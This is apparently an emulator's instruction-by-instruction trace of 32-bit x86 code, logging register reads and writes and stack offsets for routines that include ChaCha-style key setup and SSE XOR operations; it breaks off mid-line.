regs_read: [22, 2], regs_write: () 0x4259ee: mov eax, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7f98 for stack size 0x10000 0x4259f6: mov eax, dword ptr [ebp - 0xd4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7f2c for stack size 0x10000 0x4259fc: mov ecx, dword ptr [ebp - 0x80], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x14 and offset 0x7f80 for stack size 0x10000 0x4259ff: mov dword ptr [eax + 0x30], ecx, regs_read: [19, 22], regs_write: () 0x425a02: mov ecx, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x14 and offset 0x7f7c for stack size 0x10000 0x425a08: mov dword ptr [eax + 0x34], ecx, regs_read: [19, 22], regs_write: () 0x425a0b: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x14 and offset 0x7ffc for stack size 0x10000 0x425a0e: pop edi, regs_read: [30], regs_write: [30, 23] 0x425a11: pop esi, regs_read: [30], regs_write: [30, 29] 0x425a17: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x425a19: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425a20: push ebp, regs_read: [30, 20], regs_write: [30] 0x425a21: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425a23: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x425a2a: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x425a2c: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x425a2f: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x425a32: mov dword ptr [edx + 0x30], eax, regs_read: [24, 19], regs_write: () 0x425a35: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x425a37: mov dword ptr [edx + 0x34], eax, regs_read: [24, 19], regs_write: () 0x425a3a: mov eax, dword ptr [ecx + 4], regs_read: [22], regs_write: [19] 0x425a3d: mov dword ptr [edx + 0x38], eax, regs_read: [24, 19], regs_write: () 0x425a40: mov eax, dword ptr [ecx + 8], regs_read: [22], regs_write: [19] 0x425a43: mov dword ptr [edx + 0x3c], eax, regs_read: [24, 19], regs_write: () 0x425a46: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425a50: push ebp, regs_read: [30, 20], regs_write: [30] 0x425a51: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425a53: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x425a56: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x425a5d: mov dword ptr [edx + 0x30], ecx, regs_read: [24, 22], regs_write: () 0x425a62: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x425a65: mov dword ptr [edx + 0x34], eax, regs_read: [24, 19], regs_write: () 0x425a68: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x425a6a: mov dword ptr [edx + 0x38], eax, regs_read: [24, 19], regs_write: () 0x425a6d: mov eax, dword ptr [ecx + 4], regs_read: [22], regs_write: [19] 0x425a70: mov dword ptr [edx + 0x3c], eax, regs_read: [24, 19], regs_write: () 0x425a73: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425a75: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x425a77: mov dword ptr [edx + 0x30], eax, regs_read: [24, 19], regs_write: () 0x425a7a: mov eax, dword ptr [ecx + 4], regs_read: [22], regs_write: [19] 0x425a7d: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x4 and offset 0x800c for stack size 0x10000 0x425a80: mov dword ptr [edx + 0x34], eax, regs_read: [24, 19], regs_write: () 0x425a83: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x425a85: mov dword ptr [edx + 0x38], eax, regs_read: [24, 19], regs_write: () 0x425a88: mov eax, dword ptr [ecx + 4], regs_read: [22], regs_write: [19] 0x425a8b: mov dword ptr [edx + 0x3c], eax, regs_read: [24, 19], regs_write: () 0x425a8e: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425a90: push ebp, regs_read: [30, 20], regs_write: [30] 0x425a91: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x425a93: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x4 and offset 0x8008 for stack size 0x10000 0x425a96: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x4 and offset 0x800c for stack size 0x10000 0x425a99: mov dword ptr [edx], 0x61707865, regs_read: [24], regs_write: () 0x425a9f: mov dword ptr [edx + 4], 0x3320646e, regs_read: [24], regs_write: () 0x425aa6: mov dword ptr [edx + 8], 0x79622d32, regs_read: [24], regs_write: () 0x425aad: mov dword ptr [edx + 0xc], 0x6b206574, regs_read: [24], regs_write: () 0x425ab4: mov eax, dword ptr [ecx], regs_read: [22], regs_write: [19] 0x425ab6: mov dword ptr [edx + 0x10], eax, regs_read: [24, 19], regs_write: () 0x425ab9: mov eax, dword ptr [ecx + 4], regs_read: [22], regs_write: [19] 0x425abc: mov dword ptr [edx + 0x14], eax, regs_read: [24, 19], regs_write: () 0x425abf: mov eax, dword ptr [ecx + 8], regs_read: [22], regs_write: [19] 0x425ac2: mov dword ptr [edx + 0x18], eax, regs_read: [24, 19], regs_write: () 0x425ac5: mov eax, dword ptr [ecx + 0xc], regs_read: [22], regs_write: [19] 0x425ac8: mov dword ptr [edx + 0x1c], eax, regs_read: [24, 19], regs_write: () 0x425acb: mov eax, dword ptr [ecx + 0x10], regs_read: [22], regs_write: [19] 0x425ace: mov dword ptr [edx + 0x20], eax, regs_read: [24, 19], regs_write: () 0x425ad1: mov eax, dword ptr [ecx + 0x14], regs_read: [22], regs_write: [19] 0x425ad4: mov dword ptr [edx + 0x24], eax, regs_read: [24, 19], regs_write: () 0x425ad7: mov eax, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [19] 0x425ada: mov dword ptr [edx + 0x28], eax, regs_read: [24, 19], regs_write: () 0x425add: mov eax, dword ptr [ecx + 0x1c], regs_read: [22], regs_write: [19] 0x425ae0: mov dword ptr [edx + 0x2c], eax, regs_read: [24, 19], regs_write: () 0x425ae3: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425af0: push ebp, regs_read: [30, 20], regs_write: [30] 0x425af1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x425af6: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x425afd: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425b00: push ebx, regs_read: [30, 21], regs_write: [30] 0x425b01: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x8008 for stack size 0x10000 0x425b04: push esi, regs_read: [30, 29], regs_write: [30] 0x425b05: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x4 and offset 0x800c for stack size 0x10000 0x425b08: mov eax, esi, regs_read: [29], regs_write: [19] 0x425b0f: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x425b15: push eax, regs_read: [30, 19], regs_write: [30] 0x425b1b: push 0, regs_read: [30], regs_write: [30] 0x425b1d: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x425b23: push eax, regs_read: [30, 19], regs_write: [30] 0x425b29: push esi, regs_read: [30, 29], regs_write: [30] 0x425b2a: push 0, regs_read: [30], regs_write: [30] 0x425b2c: push ebx, regs_read: [30, 21], regs_write: [30] 0x425b32: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x425b38: push esi, regs_read: [30, 29], regs_write: [30] 0x425b39: push ebx, regs_read: [30, 21], regs_write: [30] 0x425b3a: push ebx, regs_read: [30, 21], regs_write: [30] 0x425b3b: push eax, regs_read: [30, 19], regs_write: [30] 0x425b44: push 0x40, regs_read: [30], regs_write: [30] 0x425b46: push eax, regs_read: [30, 19], regs_write: [30] 0x425b4f: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x40 and offset 0x7ffc for stack size 0x10000 0x425b54: pop esi, regs_read: [30], regs_write: [30, 29] 0x425b57: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425b5d: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x38 and offset 0x8000 for stack size 0x10000 0x425b5f: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425b70: push ebp, regs_read: [30, 20], regs_write: [30] 0x425b71: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425b76: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x425b7d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425b80: push ebx, regs_read: [30, 21], regs_write: [30] 0x425b81: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x425b84: push esi, regs_read: [30, 29], regs_write: [30] 0x425b85: mov esi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x800c for stack size 0x10000 0x425b88: mov eax, esi, regs_read: [29], regs_write: [19] 0x425b8f: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x425b95: push eax, regs_read: [30, 19], regs_write: [30] 0x425b9b: push 0, regs_read: [30], regs_write: [30] 0x425b9d: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x425ba3: push eax, regs_read: [30, 19], regs_write: [30] 0x425ba9: push esi, regs_read: [30, 29], regs_write: [30] 0x425baa: push 0, regs_read: [30], regs_write: [30] 0x425bac: push ebx, regs_read: [30, 21], regs_write: [30] 0x425bb2: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x425bb8: push esi, regs_read: [30, 29], regs_write: [30] 0x425bb9: push ebx, regs_read: [30, 21], regs_write: [30] 0x425bba: push ebx, regs_read: [30, 21], regs_write: [30] 0x425bbb: push eax, regs_read: [30, 19], regs_write: [30] 0x425bc4: push 0x40, regs_read: [30], regs_write: [30] 0x425bc6: push eax, regs_read: [30, 19], regs_write: [30] 0x425bcf: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x425bd4: pop esi, regs_read: [30], regs_write: [30, 29] 0x425bd7: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425bdd: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x3c and offset 0x8000 for stack size 0x10000 0x425bdf: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425bf0: push ebp, regs_read: [30, 20], regs_write: [30] 0x425bf1: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425bf6: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x425bfd: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425c00: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x425c03: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x425c06: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x425c0c: push ebx, regs_read: [30, 21], regs_write: [30] 0x425c0d: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x425c12: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 0x425c15: push dword ptr [ebp + 0x24], regs_read: [30, 20], regs_write: [30] 0x425c18: mov dword ptr [ebp - 0x50], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x425c1b: mov eax, dword ptr [ebp + 0x20], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x8 and offset 0x8020 for stack size 0x10000 0x425c1e: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x425c24: push eax, regs_read: [30, 19], regs_write: [30] 0x425c2d: push eax, regs_read: [30, 19], regs_write: [30] 0x425c2e: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x425c34: push eax, regs_read: [30, 19], regs_write: [30] 0x425c3a: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x425c40: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x425c43: push ebx, regs_read: [30, 21], regs_write: [30] 0x425c44: push dword ptr [ebp - 0x48], regs_read: [30, 20], regs_write: [30] 0x425c47: push eax, regs_read: [30, 19], regs_write: [30] 0x425c50: push 0x40, regs_read: [30], regs_write: [30] 0x425c52: push eax, regs_read: [30, 19], regs_write: [30] 0x425c5b: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ffc for stack size 0x10000 0x425c62: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425c68: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x425c6a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425c70: push ebp, regs_read: [30, 20], regs_write: [30] 0x425c71: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425c76: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x425c7d: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425c80: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x800c for stack size 0x10000 0x425c83: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x425c86: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x8010 for stack size 0x10000 0x425c8c: push ebx, regs_read: [30, 21], regs_write: [30] 0x425c8d: mov ebx, dword ptr [ebp + 8], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x8008 for stack size 0x10000 0x425c92: mov eax, dword ptr [ebp + 0x1c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x4 and offset 0x801c for stack size 0x10000 0x425c95: push dword ptr [ebp + 0x20], regs_read: [30, 20], regs_write: [30] 0x425c98: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x425c9e: push eax, regs_read: [30, 19], regs_write: [30] 0x425ca7: push eax, regs_read: [30, 19], regs_write: [30] 0x425ca8: push dword ptr [ebp + 0x18], regs_read: [30, 20], regs_write: [30] 0x425cae: push eax, regs_read: [30, 19], regs_write: [30] 0x425cb4: push dword ptr [ebp + 0x14], regs_read: [30, 20], regs_write: [30] 0x425cba: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x425cbd: push ebx, regs_read: [30, 21], regs_write: [30] 0x425cbe: push dword ptr [ebp - 0x4c], regs_read: [30, 20], regs_write: [30] 0x425cc1: push eax, regs_read: [30, 19], regs_write: [30] 0x425cca: push 0x40, regs_read: [30], regs_write: [30] 0x425ccc: push eax, regs_read: [30, 19], regs_write: [30] 0x425cd5: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x34 and offset 0x7ffc for stack size 0x10000 0x425cdc: pop ebx, regs_read: [30], regs_write: [30, 21] 0x425ce2: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x30 and offset 0x8000 for stack size 0x10000 0x425ce4: pop ebp, regs_read: [30], regs_write: [30, 20] 0x425cf0: push ebx, regs_read: [30, 21], regs_write: [30] 0x425cf1: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x425cfc: push ebp, regs_read: [30, 20], regs_write: [30] 0x425cfd: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x425d00: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x4 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x425d04: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x425d0c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x425d13: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x425d16: mov edx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [24] 0x425d19: mov ecx, edx, regs_read: [24], regs_write: [22] 0x425d1b: mov eax, dword ptr [ebx + 8], regs_read: [21], regs_write: [19] 0x425d1e: push esi, regs_read: [30, 29], regs_write: [30] 0x425d1f: mov esi, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [29] 0x425d22: mov dword ptr [ebp - 0x70], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x8 and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x425d25: mov edx, dword ptr [ebx + 0x18], regs_read: [21], regs_write: [24] 0x425d2a: push edi, regs_read: [30, 23], regs_write: [30] 0x425d2b: mov edi, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [23] 0x425d2e: mov dword ptr [ebp - 0x68], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x425d31: mov edx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [24] 0x425d34: mov dword ptr [ebp - 0x6c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 saving data to stack: 0 4 0x425d40: mov dword ptr [ebp - 0x64], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 saving data to stack: 0 4 0x425d43: mov ecx, dword ptr [ebx + 0x18], regs_read: [21], regs_write: [22] 0x425dab: movaps xmmword ptr [ebp - 0x270], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7d90 for stack size 0x10000 saving data to stack: 0 16 0x425dbc: movaps xmmword ptr [ebp - 0x250], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 saving data to stack: 0 16 0x425dcd: movaps xmmword ptr [ebp - 0x260], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7da0 for stack size 0x10000 saving data to stack: 0 16 0x425dde: movaps xmmword ptr [ebp - 0x240], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 saving data to stack: 0 16 0x425dea: mov dword ptr [ebp - 0x50], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x425df8: mov dword ptr [ebp - 0x4c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x425e01: movaps xmmword ptr [ebp - 0x210], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x425e0d: mov dword ptr [ebp - 0x58], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 saving data to stack: 0 4 0x425e1b: mov dword ptr [ebp - 0x60], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x425e21: movaps xmmword ptr [ebp - 0x220], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 saving data to stack: 0 16 0x425e2d: mov dword ptr [ebp - 0x54], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x425e38: movaps xmmword ptr [ebp - 0x160], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x425e3f: movaps xmmword ptr [ebp - 0x170], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 16 0x425e46: movaps xmmword ptr [ebp - 0x180], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e80 for stack size 0x10000 saving data to stack: 0 16 0x425e4d: movaps xmmword ptr [ebp - 0x190], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x425e54: movaps xmmword ptr [ebp - 0x1a0], xmm5, regs_read: [20, 127], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x425e5b: movaps xmmword ptr [ebp - 0x1b0], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x425e62: movaps xmmword ptr [ebp - 0x1c0], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x425e69: movaps xmmword ptr [ebp - 0x230], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 saving data to stack: 0 16 0x425e70: mov dword ptr [ebp - 0x5c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 saving data to stack: 0 4 0x425e73: mov edx, dword ptr [eax + 0x34], regs_read: [19], regs_write: [24] 0x425e76: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x425e79: movaps xmmword ptr [ebp - 0x100], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x425e85: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x425e88: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x425e8f: movaps xmm0, xmmword ptr [ebp - 0x250], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 0x425e96: movaps xmmword ptr [ebp - 0x90], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 16 0x425e9d: movaps xmm0, xmmword ptr [ebp - 0x260], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7da0 for stack size 0x10000 0x425ea4: movaps xmm7, xmmword ptr [ebp - 0x220], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 0x425eab: movaps xmmword ptr [ebp - 0xa0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 16 0x425eb2: movaps xmm0, xmmword ptr [ebp - 0x240], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 0x425eb9: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x425ec0: movaps xmm0, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 0x425ec7: movaps xmmword ptr [ebp - 0x1d0], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x425ece: movaps xmmword ptr [ebp - 0x130], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 16 0x425ee0: movaps xmmword ptr [ebp - 0xe0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 16 0x425ee7: movaps xmm2, xmmword ptr [ebp - 0x270], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7d90 for stack size 0x10000 0x425ef5: movaps xmm0, xmmword ptr [0x4c9c90], regs_read: (), regs_write: [122] 0x425f00: movaps xmmword ptr [ebp - 0xb0], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 16 0x425f0b: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x425f0e: movaps xmmword ptr [ebp - 0xc0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7f40 for stack size 0x10000 saving data to stack: 0 16 0x425f1d: movaps xmm6, xmm2, regs_read: [124], regs_write: [128] 0x425f20: movaps xmmword ptr [ebp - 0xf0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x425f2b: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x425f2e: movaps xmm5, xmmword ptr [ebp - 0x230], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 0x425f35: movaps xmm4, xmm6, regs_read: [128], regs_write: [126] 0x425f44: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x425f47: mov dword ptr [eax + 0x30], ecx, regs_read: [19, 22], regs_write: () 0x425f4a: mov ecx, 0xa, regs_read: (), regs_write: [22] 0x425f4f: movaps xmmword ptr [ebp - 0xd0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 16 0x425f56: movaps xmmword ptr [ebp - 0x200], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x425f5d: movaps xmmword ptr [ebp - 0x150], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x425f64: mov dword ptr [eax + 0x34], edx, regs_read: [19, 24], regs_write: () 0x425f70: movaps xmm5, xmmword ptr [ebp - 0x80], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 0x425f74: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x425f7f: pxor xmm4, xmm2, regs_read: [126, 124], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x425f8c: movaps xmm3, xmm4, regs_read: [126], regs_write: [125] 0x425f97: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x425f9a: pxor xmm0, xmmword ptr [ebp - 0xd0], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 0x425fa2: movaps xmm1, xmm0, regs_read: [122], regs_write: [123] 0x425fb3: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x425fba: movaps xmm2, xmmword ptr [ebp - 0x100], regs_read: [20], regs_write: [124] adjusting stack for ESP -0xc and offset 0x7f00 for stack size 0x10000 0x425fc9: pxor xmm4, xmm0, regs_read: [126, 122], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x425fd6: movaps xmmword ptr [ebp - 0x90], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 